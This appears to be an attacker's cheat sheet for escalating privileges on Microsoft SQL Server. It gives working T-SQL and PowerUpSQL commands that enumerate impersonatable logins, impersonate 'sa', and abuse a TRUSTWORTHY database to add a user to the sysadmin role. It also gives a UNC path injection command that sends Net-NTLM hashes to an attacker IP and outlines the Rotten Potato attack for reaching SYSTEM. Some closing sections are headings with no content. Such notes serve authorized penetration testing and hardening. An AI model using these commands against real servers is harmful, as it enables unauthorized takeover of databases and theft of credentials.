# Find Impersonatable Accounts

```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

> https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/

```
Invoke-SQLAuditPrivImpersonateLogin -Username un -Password pw -Instance dbname -Verbose
```

# Execute As

```
EXECUTE AS LOGIN = 'dbadmin'
```

```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

EXECUTE AS LOGIN = 'dbadmin'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()

EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
```
> https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql

# Trustworthy Databases

* `is_trustworthy_off` by default (Only a sysadmin can change).
* When `off` impersonated users will only have database-scope permissions.
* When `on` impersonated users can perform actions with server level permissions.
* Allows writing procedures that can execute code with server level permission.

If `is_trustworthy_on` and if a `sysadmin` (not necessarily `sa`) is owner of the database, it is possible for the database owner (a user with `db_owner`) to elevate privileges to `sysadmin`.

> https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property
> http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/

## Discover Trustworthy Databases

```
SELECT name as database_name
, SUSER_NAME(owner_sid) AS database_owner
, is_trustworthy_on AS TRUSTWORTHY
from sys.databases
```

```
Invoke-SQLAudit -Instance instance-name -Verbose | Out-GridView
Invoke-SQLAuditPrivTrustworthy -Instance instance-name -Verbose
```

## Exploitation

Add `sysadmin` to `myuser`:

```
EXECUTE AS USER = 'dbo'
SELECT system_user
EXEC sp_addsrvrolemember 'example.com\myuser','sysadmin'
```

# Public to Service Account

## UNC Path Injection

* Capture Net-NTLM (also known as NTLMv1/v2) hashes
* Stored procedures like `xp_dirtree` and `xp_fileexist` can be used to capture Net-NTLM hashes

```
Invoke-SQLUncPathInjection -Verbose -CaptureIp 192.168.1.11
```

UNC Path Injection cheatsheet:

> https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e

# Service Account to System

## Rotten Potato

* Trick the "NT AUTHORITY\SYSTEM" account into authenticating via NTLM to a TCP endpoint attacker control.
* Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account
* Impersonate the token we have just negotiated.
* Usable only if attackers current account has the privilege to impersonate security tokens.

> https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

## Extracting service account credentials from LSA Secrets and/or memory

## Token Impersonation for the SQL Server service

## Single user mode
